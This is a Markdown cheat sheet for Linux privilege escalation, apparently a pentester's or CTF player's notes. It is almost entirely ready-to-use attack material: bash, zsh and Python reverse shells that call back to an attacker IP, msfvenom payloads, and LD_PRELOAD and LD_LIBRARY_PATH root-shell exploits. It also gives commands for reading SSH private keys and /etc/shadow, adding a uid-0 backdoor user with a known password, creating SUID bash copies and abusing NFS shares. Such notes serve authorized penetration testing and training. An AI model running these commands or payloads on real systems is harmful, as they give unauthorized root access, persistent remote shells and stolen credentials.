# Linux privilege escalation
* [Utilities](#utilities)
    * [Shell stabilization and interactivity](#shell-stabilization-and-interactivity)
    * [Useful reverse shells](#useful-reverse-shells)
    * [Port tunneling](#port-tunneling)
    * [Copy files from/to the target](#copy-files-fromto-the-target)
* [Autoenumeration _(LinPEAS)_](#autoenumeration-linpeas)
* [Monitoring processes _(PSPY)_](#monitoring-processes-pspy)
* [Autoenumeration _(Linux Smart Enumeration)_](#autoenumeration-linux-smart-enumeration)
* [Linux Exploit Suggester](#linux-exploit-suggester)
* [Manual enumeration](#manual-enumeration)
    * [System](#system)
    * [Users and groups](#users-and-groups)
    * [Apps and services](#apps-and-services)
    * [Network](#network)
    * [Files and folders](#files-and-folders)
* [Possible escalation vectors in programs](#possible-escalation-vectors-in-programs)
* [Compiling exploits and tools](#compiling-exploits-and-tools)
* [Readable /etc/shadow exploit](#readable-etcshadow-exploit)
* [Writable /etc/passwd or /etc/shadow exploit](#writable-etcpasswd-or-etcshadow-exploit)
* [Exploiting wildcards](#exploiting-wildcards)
* [Modifying `$PATH` for SUID/SUDO programs](#modifying-path-for-suidsudo-programs)
* [Exploiting capabilities](#exploiting-capabilities)
* [Python library hijacking](#python-library-hijacking)
* [`LD_PRELOAD` exploit](#ld_preload-exploit)
* [`LD_LIBRARY_PATH` exploit](#ld_library_path-exploit)
* [Compiling a shared library running bash shell](#compiling-a-shared-library-running-bash-shell)
* [Compiling a service running bash shell](#compiling-a-service-running-bash-shell)
* [Permissions modification in NFS](#permissions-modification-in-nfs)

## Utilities
### Shell stabilization and interactivity
- Listen to reverse shell:
```bash
rlwrap nc -lvnp 443
```
- Upgrade the shell:
```bash
python -c 'import pty;pty.spawn("/bin/bash")' # Explicit python version may be required.
```

### Useful reverse shells
- Reverse shell oneliners:
```bash
bash -i >& /dev/tcp/<ip>/443 0>&1 # bash
bash -c "bash -i >& /dev/tcp/<ip>/443 0>&1" # sh or dash
zsh -c 'zmodload zsh/net/tcp && ztcp <ip> 443 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY' # zsh
```
- Reverse shell encoded oneliner:
```bash
echo "bash -c 'bash -i >& /dev/tcp/<ip>/443 0>&1'" | base64
echo '<payload>' | base64 --decode | bash
```
- TCP reverse shell executable:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf > shell.elf
```

### Port tunneling
```bash
ssh -L <local_port>:localhost:<port> <target_username>@<target_ip> # Run on kali to forward a blocked port
```

### Copy files from/to the target
- SCP:
```bash
scp <username>@<ip>:<filename_in_user_directory> .
scp <filename> <username>@<ip>:<path>
```
- FTP:
```bash
python3 -m pyftpdlib -w -p 2121
```
```cmd
ftp # anonymous and empty pass
open <ip> 2121
put <some_local_file>
```
- HTTP:
```bash
sudo python3 -m http.server 80

wget http://<my_ip>/<filename>
curl http://<my_ip>/<filename> --output <filename>
```

## Autoenumeration _(LinPEAS)_
- Prepare:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O ./linpeas.sh

cp ~/pentesting-tools/linpeas/linpeas.sh ./linpeas.sh # Or my stored version
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```bash
./linpeas.sh > linpeas.txt
./linpeas.sh -a > linpeas.txt # Full search
less -r linpeas.txt
```

## Monitoring processes _(PSPY)_
- Prepare:
```bash
cp ~/pentesting-tools/pspy/pspy32 ./pspy

cp ~/pentesting-tools/pspy/pspy64 ./pspy # 64 bit version
cp ~/pentesting-tools/pspy/pspy32s ./pspy # 32 bit small version
cp ~/pentesting-tools/pspy/pspy64s ./pspy # 64 bit small version
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```bash
./pspy # Needs process interrupt key to stop
```

## Autoenumeration _(Linux Smart Enumeration)_
- Prepare:
```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -O ./lse.sh

cp ~/pentesting-tools/lse/lse.sh ./lse.sh # Or my stored version
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```bash
./lse.sh -i -l0 # Default level of information. Increase it up to 2 if nothing is found
```

## Linux Exploit Suggester
- Prepare:
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

cp ~/pentesting-tools/les/les.sh ./les.sh # Or my stored version
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```bash
./les.sh
```

## Manual enumeration
### System
- System info:
```bash
cat /etc/issue
cat /etc/*-release
cat /proc/version
uname -a
rpm -q kernel
```
- Environment variables:
```bash
cat /etc/profile
cat /etc/bashrc
printenv
env
```

### Users and groups
- Current user:
```bash
id
whoami
```
- Other users:
```bash
cat /etc/passwd
```
- Groups:
```bash
groups
cat /etc/group
```
- User management files permissions:
```bash
ls -l /etc/passwd
ls -l /etc/shadow
ls -l /etc/sudoers
ls -l /etc/group
```
- `sudo` user privileges :
```bash
sudo -l
```
- Shell history and configs:
```bash
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.profile
cat ~/.bash_logout
cat ~/.bash_history
```
- Mails:
```bash
ls -l /var/mail
ls -l /var/spool/mail
```
- SSH:
```bash
cat /home/<username>/.ssh/authorized_keys
cat /home/<username>/.ssh/identity.pub
cat /home/<username>/.ssh/identity
cat /home/<username>/.ssh/id_rsa.pub
cat /home/<username>/.ssh/id_rsa
cat /home/<username>/.ssh/id_dsa.pub
cat /home/<username>/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
```

### Apps and services
- Current processes
```bash
ps aux
ps -ef
top
ps aux | grep root
ps -ef | grep root
```
- Installed apps:
```bash
ls -lah /usr/bin/
ls -lah /usr/local/bin/
ls -lah /usr/local/sbin/
ls -lah /opt
```
- Scheduled jobs:
```bash
cat /etc/crontab
ls -l /var/spool/cron
ls -l /var/spool/cron/crontabs
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/anacrontab
```
- SUID/SGID programs:
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null # SUID and SGID with permissions
find / -perm -u=s -type f 2>/dev/null # SUID only
find / -perm -g=s -type f 2>/dev/null # SGID only
```
- Files with capabilities:
```bash
getcap -r / 2>/dev/null
```

### Network
- General info:
```bash
hostname
ifconfig
```
- Open ports:
```bash
lsof -i
netstat -antup
ss -tulpn
nc -z -v 127.0.0.1 1-65535
```
- NFS shares:
```bash
cat /etc/exports # Check if no_root_squash is set
```

### Files and folders
- List files in common folders:
```bash
ls -lah ~
ls -lah /tmp
ls -lah /opt
ls -lah /opt/backup
ls -lah /usr/local
ls -lah /var/backups
ls -lah /var/logs
ls -lah /var/lib
ls -lah /var/www
```
- File systems:
```bash
mount
df -h
cat /etc/fstab
```
- Search for strings in file that don't start with `# ` _(useful for config files)_:
```bash
cat <filename> | grep -v "^# "
```
- Search files contents:
```bash
grep -rnw '/' -e '<search_query>' 2> /dev/null
```
- Search for all .txt files:
```bash
locate *.txt
find / -type f -name "*.txt" 2>/dev/null
```

## Possible escalation vectors in programs
- https://gtfobins.github.io/

## Compiling exploits and tools
- Use this to compile exploits and tools if no specific instructions provided:
```bash
gcc <file> -o <output_file> # add -fPIC for 64-bit machines
g++ <file> -o <output_file>
```
- If a target machine doesn't have required tools to compile an exploit cross-compile it on Kali _(add `-m32` option for 32-bit machines)_.

## Readable /etc/shadow exploit
- Just read the hash.
- Or use `unshadow` _(on target or personal machine)_:
```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
```

## Writable /etc/passwd or /etc/shadow exploit
- Create a password:
```bash
openssl passwd -1 -salt <salt_like_username> <password>
```
- Or use this prepared user:
```bash
echo "new:\$1\$new\$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash" >> /etc/passwd
```
- Switch to the new user:
```bash
su new # password:123
```

## Exploiting wildcards
- Check options for the command that uses the wildcard: https://gtfobins.github.io/gtfobins/
- Create files in the current directory with filenames as options:
```bash
touch ./--<command_option>
```

## Modifying `$PATH` for SUID/SUDO programs
- Make alternative command which runs privileged bash:
```bash
echo "/bin/bash -p" > /tmp/<command>
chmod +x /tmp/<command>
```
- Modify `$PATH`:
```bash
export PATH=/tmp:$PATH # To start searching for the <command> in /tmp first
```
- Or run program and pass `$PATH` to it _(this may also work for `sudo` commands with no secure_path set)_:
```bash
PATH=/tmp:$PATH <program_name>
```

## Exploiting capabilities
- Possibly dangerous capabilities:
```
=ep, CAP_CHOWN, CAP_DAC_OVERRIDE, CAP_DAC_READ_SEARCH, CAP_SETUID, CAP_SETGID, CAP_NET_RAW, CAP_SYS_ADMIN, 
CAP_SYS_PTRACE, CAP_SYS_MODULE, CAP_FORMER, CAP_SETFCAP
```
- Example exploiting `CAP_SETUID` set for python3:
```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Python library hijacking
- Check library loading locations order:
```bash
python -c 'import sys; print "\n".join(sys.path)' # The first empty one is the current dir
```
- Create required library copy keeping the same class/method signature and populate with the reverse shell code:
```python
import os
import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ip>",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```
- Put code in the proper location if possible.
- Or modify PYTHONPATH env variable if sudo SETENV is set:
```bash
sudo PYTHONPATH=/tmp/ /usr/bin/<some_python> <some_vulnerable_python_script>
```

## `LD_PRELOAD` exploit
- If `env_keep+=LD_PRELOAD` is set, use this exploit.
- `ld_preload_exploit.c`:
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
- Compile it:
```bash
gcc -shared -fPIC -nostartfiles -o /tmp/ld_preload.so ld_preload_exploit.c
```
- Run sudo program with `LD_PRELOAD`:
```bash
sudo LD_PRELOAD=/tmp/ld_preload.so <sudo_program>
```

## `LD_LIBRARY_PATH` exploit
- If `env_keep+=LD_LIBRARY_PATH` is set use this exploit.
- Pick the shared library to replace:
```bash
ldd <sudo_program>
```
- `ld_library_path_exploit.c`:
```C
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor))

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash"); // Or /bin/bash -p
}
```
- Or create the file in one line:
```bash
echo -e "#include <stdio.h>\n#include <stdlib.h>\nstatic void hijack() __attribute__((constructor))\nvoid hijack() {\nunsetenv("LD_LIBRARY_PATH");\nsetresuid(0,0,0);\nsystem(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash\");}" > ld_library_path_exploit.c
```
- Compile it:
```bash
gcc -shared -fPIC -o ./<picked_library_name> ld_library_path_exploit.c
```
- Run sudo program with `LD_LIBRARY_PATH`:
```bash
sudo LD_LIBRARY_PATH=. <sudo_program>
```

## Compiling a shared library running bash shell
- Use `strace` to search for not found shared libraries in the application running by root.
- `bash_shared.c`:
```C
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject() {
	setuid(0);
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash"); // Or /bin/bash -p
}
```
- Or create the file in one line:
```bash
echo -e "#include <stdio.h>\n#include <stdlib.h>\nstatic void inject() __attribute__((constructor));\nvoid inject() {\nsetuid(0);\nsystem(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash\");}" > bash_shared.c
```
- Compile it to the .so shared library file:
```bash
gcc -shared -fPIC -o <library_name>.so bash_shared.c
```

## Compiling a service running bash shell
- `bash_service.c`:
```C
int main() {
	setuid(0);
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash"); // Or /bin/bash -p
}
```
- Or create the file in one line:
```bash
echo -e "int main() {\nsetuid(0);\nsystem(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash\");}" > bash_service.c
```
- Compile it to the service file:
```bash
gcc -o <service_name> bash_service.c
```

## Permissions modification in NFS
- Mount the NFS share:
```bash
mkdir /tmp/mounted_share
sudo mount -t nfs <ip>:<share_name> /tmp/mounted_share/ -nolock
```
- Prepare the shell:
```bash
sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/mounted_share/shell.elf
```
- Add permissions:
```bash
sudo chmod +xs /tmp/mounted_share/shell.elf
```
- Run bash from the low privileged user on the target machine:
```bash
./shell.elf
```